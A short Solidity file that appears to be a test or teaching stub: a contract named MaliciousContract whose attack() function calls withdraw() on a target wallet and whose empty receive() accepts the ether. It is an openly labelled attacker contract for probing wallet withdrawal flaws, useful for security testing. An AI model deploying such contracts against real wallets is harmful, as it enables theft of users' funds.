// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWallet {
    function withdraw() external;
}

contract MaliciousContract {

    IWallet public wallet;

    constructor(address _wallet) {
        wallet = IWallet(_wallet);
    }

    function attack() external {
        wallet.withdraw();
    }

    receive() external payable {}
}
